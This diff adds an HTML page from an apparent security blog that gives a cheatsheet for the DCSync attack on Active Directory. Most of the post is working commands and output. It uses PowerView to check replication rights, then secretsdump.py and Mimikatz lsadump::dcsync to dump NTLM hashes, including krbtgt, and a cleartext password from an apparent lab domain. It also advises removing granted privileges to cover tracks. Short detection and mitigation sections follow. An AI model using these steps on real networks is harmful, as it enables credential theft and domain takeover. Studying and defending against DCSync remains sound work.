@@ -1,0 +1,344 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      Achieving Domain Compromise via the DCSync Technique [CHEATSHEET] | MazeZero</title>
+  <meta name="author" content="M3zeZer0">
+  
+  <meta name="description" content="DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Achieving Domain Compromise via the DCSync Technique [CHEATSHEET]"/>
+  <meta property="og:site_name" content="MazeZero"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="MazeZero" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/about.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.png" />
+        <link rel="shortcut icon" href="/favicon.png" />
+        <link rel="manifest" href="/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			MazeZero
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Cheatsheets & Notes
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Achieving Domain Compromise via the DCSync Technique [CHEATSHEET]</h1>
+		</div>
+	
+
+
+
+	<div class="row post">
+		<!-- cols -->
+		
+			<div id="top_meta"></div>
+			<div class="col-md-9">
+				
+
+							<!-- content -->
+							<div class="mypage">
+								
+									<!-- <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
+		 </div> alert -->
+									
+
+										<h1 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h1><p>DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.</p>
+<span id="more"></span> 
+<p>The core of the attack involves exploiting the DS-Replication-Get-Changes-All extended right to prompt a Domain Controller to replicate password data. This specific Active Directory permission grants access to replicate sensitive, secret information across the domain.</p>
+<p><img src="/../images/REPACE.png" alt="Directory Replication Service Remote Protocol exploitation diagram"></p>
+<hr>
+<h2 id="Prerequisites-Checking-Replication-Rights"><a href="#Prerequisites-Checking-Replication-Rights" class="headerlink" title="Prerequisites: Checking Replication Rights"></a>Prerequisites: Checking Replication Rights</h2><p>PowerView can be used to confirm that a user has the necessary replication permissions assigned to their account.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sid</span> = <span class="string">&quot;&#123;sid-here&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-ObjectAcl</span> <span class="string">&quot;DC=echoridge,DC=local&quot;</span> <span class="literal">-ResolveGUIDs</span> | ? &#123; (<span class="variable">$_</span>.ObjectAceType <span class="operator">-match</span> <span class="string">&#x27;Replication-Get&#x27;</span>)&#125; | ?&#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-match</span> <span class="variable">$sid</span>&#125; | <span class="built_in">select</span> AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | <span class="built_in">fl</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=echoridge,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1164</span></span><br><span class="line">ObjectAceType         : DS<span class="literal">-Replication-Get-Changes-In-Filtered-Set</span></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=echoridge,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1164</span></span><br><span class="line">ObjectAceType         : DS<span class="literal">-Replication-Get-Changes</span></span><br></pre></td></tr></table></figure>
+
+<p>If we had certain rights over the user (such as <a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl">WriteDacl</a>), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks.</p>
+<hr>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Using-secretsdump-py-Linux"><a href="#Using-secretsdump-py-Linux" class="headerlink" title="Using secretsdump.py (Linux)"></a>Using secretsdump.py (Linux)</h3><p>Running the tool as below will write all hashes to files with the prefix <code>echoridge_hashes</code>. The <code>-just-dc</code> flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">secretsdump.py -outputfile echoridge_hashes -just-dc echoridge/adunn@172.16.5.5</span> </span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5</span><br><span class="line">[*] Searching for NTDS.dit</span><br><span class="line">[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time</span><br><span class="line">[*] Using smbexec method for remote execution</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching for pekList, be patient</span><br><span class="line">[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6</span><br><span class="line">[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp </span><br><span class="line">echoridge.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::</span><br></pre></td></tr></table></figure>
+
+<p><strong>Useful flags:</strong></p>
+<ul>
+<li><code>-just-dc-ntlm</code> - Only extract NTLM hashes</li>
+<li><code>-just-dc-user &lt;USERNAME&gt;</code> - Extract data for a specific user only</li>
+<li><code>-pwd-last-set</code> - Show when each account’s password was last changed</li>
+<li><code>-history</code> - Dump password history</li>
+<li><code>-user-status</code> - Check if a user is disabled</li>
+</ul>
+<hr>
+<h3 id="Using-Mimikatz-Windows"><a href="#Using-Mimikatz-Windows" class="headerlink" title="Using Mimikatz (Windows)"></a>Using Mimikatz (Windows)</h3><p>Mimikatz must be run in the context of the user who has DCSync privileges. Use <code>runas.exe</code> to accomplish this:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">runas</span> /<span class="title">netonly</span> /<span class="title">user:echoridge</span>\<span class="title">adunn</span> <span class="title">powershell</span></span></span><br><span class="line"><span class="function"><span class="title">Enter</span> <span class="title">the</span> <span class="title">password</span> <span class="title">for</span> <span class="title">echoridge</span>\<span class="title">adunn</span>:</span></span><br><span class="line"><span class="function"><span class="title">Attempting</span> <span class="title">to</span> <span class="title">start</span> <span class="title">powershell</span> <span class="title">as</span> <span class="title">user</span> &quot;<span class="title">echoridge</span>\<span class="title">adunn</span>&quot; ...</span></span><br></pre></td></tr></table></figure>
+
+<p>From the newly spawned powershell session, perform the attack:</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:echoridge.local /user:echoridge\administrator</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;echoridge.local&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;DC01.echoridge.local&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;echoridge\administrator&#x27;</span> will be the user account</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : administrator</span><br><span class="line">User Principal Name  : administrator@echoridge.local</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Password last change : <span class="number">10</span>/<span class="number">27</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">49</span>:<span class="number">32</span> AM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-500</span></span><br><span class="line">Object Relative ID   : <span class="number">500</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">88</span>ad09182de639ccc6579eb0849751cf</span><br></pre></td></tr></table></figure>
+
+<p><strong>Note:</strong> <code>sekurlsa::logonpasswords</code> for credentials in memory doesn’t work past Server 2012.</p>
+<hr>
+<h3 id="Targeted-DCSync"><a href="#Targeted-DCSync" class="headerlink" title="Targeted DCSync"></a>Targeted DCSync</h3><p>Retrieve user SID and check permissions by providing samAccountName:</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$SID</span> = <span class="built_in">Convert-Name</span><span class="literal">-TO-SID</span> &lt;name&gt;</span><br><span class="line"><span class="built_in">get-domainobjectACL</span> <span class="literal">-ResolveGUIDs</span> <span class="literal">-Identity</span> * | ? &#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> <span class="variable">$SID</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Run mimikatz and dump NTLM Hash for the target user:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./mimikatz.exe</span><br><span class="line">lsadump::dcsync /domain:&#123;&#125; /user:&#123;domain\targetuser&#125; </span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Reversible-Encryption-Passwords"><a href="#Reversible-Encryption-Passwords" class="headerlink" title="Reversible Encryption Passwords"></a>Reversible Encryption Passwords</h2><p>When the “Store password using reversible encryption” option is set on a user account, passwords are stored using RC4 encryption (not cleartext). The key needed to decrypt them is stored in the registry (the <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview">Syskey</a>) and can be extracted by a Domain Admin.</p>
+<p>Tools like <code>secretsdump.py</code> will automatically decrypt any passwords stored using reversible encryption while dumping the NTDS file.</p>
+<h3 id="Enumerate-Accounts-with-Reversible-Encryption"><a href="#Enumerate-Accounts-with-Reversible-Encryption" class="headerlink" title="Enumerate Accounts with Reversible Encryption"></a>Enumerate Accounts with Reversible Encryption</h3><p>Using Get-ADUser:</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> <span class="string">&#x27;userAccountControl -band 128&#x27;</span> <span class="literal">-Properties</span> userAccountControl</span><br><span class="line"></span><br><span class="line">DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=echoridge,DC=LOCAL</span><br><span class="line">Enabled            : True</span><br><span class="line">Name               : PROXYAGENT</span><br><span class="line">SamAccountName     : proxyagent</span><br><span class="line">userAccountControl : <span class="number">640</span></span><br></pre></td></tr></table></figure>
+
+<p>Using PowerView:</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> * | ? &#123;<span class="variable">$_</span>.useraccountcontrol <span class="operator">-like</span> <span class="string">&#x27;*ENCRYPTED_TEXT_PWD_ALLOWED*&#x27;</span>&#125; | <span class="built_in">select</span> samaccountname,useraccountcontrol</span><br><span class="line"></span><br><span class="line">samaccountname                         useraccountcontrol</span><br><span class="line"><span class="literal">--------------</span>                         <span class="literal">------------------</span></span><br><span class="line">proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT</span><br></pre></td></tr></table></figure>
+
+<h3 id="Viewing-Decrypted-Passwords"><a href="#Viewing-Decrypted-Passwords" class="headerlink" title="Viewing Decrypted Passwords"></a>Viewing Decrypted Passwords</h3><p>The tool will decrypt the password and provide the cleartext value:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> echoridge_hashes.ntds.cleartext</span> </span><br><span class="line"></span><br><span class="line">proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Detection"><a href="#Detection" class="headerlink" title="Detection"></a>Detection</h2><p>To detect DCSync activity, monitor the TargetLogonId from Event 4624 and correlate it with other security events tied to the same logon session. DCSync generates a Network Logon type (3) on the DC. By linking Event 4662 (which tracks directory access) with Event 4624 using the LogonId, defenders can identify the source IP of the DCSync request.</p>
+<p><img src="/../images/imasasage.png" alt="DCSync detection using Event 4624 and 4662 correlation"></p>
+<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><p>DCSync attacks exploit replication permissions in Active Directory to extract sensitive credentials. To mitigate:</p>
+<ol>
+<li><p><strong>Limit replication rights</strong> - Only Domain Controllers and essential admin accounts should have replication privileges. Audit and remove unnecessary permissions.</p>
+</li>
+<li><p><strong>Monitor for DCSync behavior</strong> - Detect suspicious replication attempts by monitoring security logs and using threat detection tools.</p>
+</li>
+<li><p><strong>Protect privileged accounts</strong> - Restrict and monitor Domain Admins. Use tiered admin models and Protected Users group where possible.</p>
+</li>
+<li><p><strong>Regularly audit privileged access</strong> - Frequently review permissions and group memberships. Remove outdated accounts and rotate credentials.</p>
+</li>
+</ol>
+
+											<div class="article-footer-copyright">
+
+</div>
+
+							</div>
+
+							
+									
+											<div>
+												<center>
+
+													<div class="pagination">
+
+    
+    
+    <a href="/2025/05/22/Attacking lsass/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2025/01/22/HTB-Cicada/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+												</center>
+											</div>
+
+											<!-- comment -->
+											<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+											
+													
+															
+					</div> <!-- col-md-9/col-md-12 -->
+
+
+
+					
+						<div class="col-md-3" id="side_meta">
+							<div id="post_meta">
+
+	<!-- date -->
+	
+		<div class="meta-widget">
+			<i class="fa fa-clock-o"></i>
+			2025-03-26
+		</div>
+		
+
+			<!-- categories -->
+			
+
+					<!-- tags -->
+					
+						<div class="meta-widget">
+							<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>
+							<ul id="tags" class="tag_box list-unstyled collapse in">
+								  
+  <li><a href="/tags/mimikatz/">mimikatz<span>2</span></a></li> <li><a href="/tags/AD/">AD<span>2</span></a></li> <li><a href="/tags/Active-Directory/">Active Directory<span>2</span></a></li> <li><a href="/tags/Lateral-Movement/">Lateral Movement<span>2</span></a></li> <li><a href="/tags/dcsync/">dcsync<span>1</span></a></li>
+							</ul>
+						</div>
+						
+
+
+
+							<hr>
+
+                            <!-- Table of Contents -->
+                            <div id="content-toc" class="blog-toc">
+                                <div id="toc-nav" class="toc-nav"></div>
+                            </div>
+</div><!-- col-md-3 -->
+						</div>
+						
+
+
+			</div><!-- row -->
+
+			<!--
+ -->
+
+
+			<!-- Fixed TOC Container for hexo-toc.js -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2026 M3zeZer0's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  <a id="gotop" href="#">
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script>
+<script src="/js/hexo-toc.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript">
+    (function ($) {
+      $('.fancybox').fancybox();
+    })(jQuery);
+  </script>
+  
+
+    
+      <script type="text/javascript">
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+          search_path = "search.xml";
+        }
+        var path = "/" + search_path;
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      </script>
+      
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
